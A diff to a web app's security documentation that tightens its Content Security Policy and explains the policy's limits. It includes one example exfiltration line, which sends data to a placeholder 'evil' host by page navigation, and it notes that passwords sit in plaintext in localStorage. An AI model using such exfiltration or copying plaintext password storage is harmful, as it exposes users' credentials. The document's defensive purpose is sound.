@@ -35,6 +35,7 @@ Headers are set in `apps/web/next.config.ts` with `async headers()` on `source: 
 ```
 default-src 'self';
 script-src 'self' 'unsafe-inline';
+script-src-attr 'none';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: blob:;
 font-src 'self' data:;
@@ -49,7 +50,9 @@ frame-ancestors 'none'
 
 **Development** adds `'unsafe-eval'` to `script-src` and `ws:` to `connect-src` (React dev tooling and Turbopack HMR), and drops HSTS. Vercel **preview** deployments (`VERCEL_ENV=preview`) add `https://vercel.live` to `script-src`, `connect-src`, `img-src`, `style-src`, `font-src` and `frame-src` for the Vercel toolbar. Production does not.
 
-This is a **static policy**. `'unsafe-inline'` in `script-src` is the deliberate trade-off that keeps the page static, cacheable and compatible with the service worker's precache. All the other directives — no framing, no `<base>` hijack, no plugins, only same-origin connections, so no exfiltration by `fetch` — still apply, and React text rendering remains the primary XSS defence.
+This is a **static policy**. `'unsafe-inline'` in `script-src` is the deliberate trade-off that keeps the page static, cacheable and compatible with the service worker's precache. `script-src-attr 'none'` keeps inline event-handler attributes (`onclick=...`) blocked even though inline `<script>` is allowed: the app uses none, and injected markup is the commonest XSS shape. The other directives — no framing, no `<base>` hijack, no plugins, same-origin `connect-src` — still apply, and React text rendering remains the primary XSS defence.
+
+**What the CSP does not stop.** `connect-src 'self'` blocks exfiltration by `fetch`/XHR/WebSocket only. It does **not** stop exfiltration by top-level navigation (`location = 'https://evil/?' + data`): `navigate-to` was never shipped, and `Referrer-Policy: no-referrer` only hides the referrer. Today the web client keeps daemon passwords in `localStorage` in plaintext, so any script that runs on the origin can read and leak them. The CSP is therefore defence in depth; the real controls are no injection sinks and, tracked separately, not storing the password client-side (see `docs/security.md`).
 
 ## Open question
 
